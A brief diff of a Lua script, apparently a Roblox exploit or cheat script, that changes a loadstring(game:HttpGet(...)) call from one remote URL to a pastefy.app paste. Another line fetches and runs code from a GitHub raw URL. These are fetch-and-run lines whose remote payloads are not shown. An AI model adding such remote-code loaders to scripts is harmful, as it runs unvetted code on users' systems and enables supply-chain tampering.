@@ -350,9 +350,9 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://synapse-loadstringer.lovable.app/raw/b82ef8e1de23"))()
+    loadstring(game:HttpGet("https://pastefy.app/eDmA1TWp/raw"))()
 
-    task.wait(1)
+task.wait(1)
 
     local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
     if type(script) == "function" then
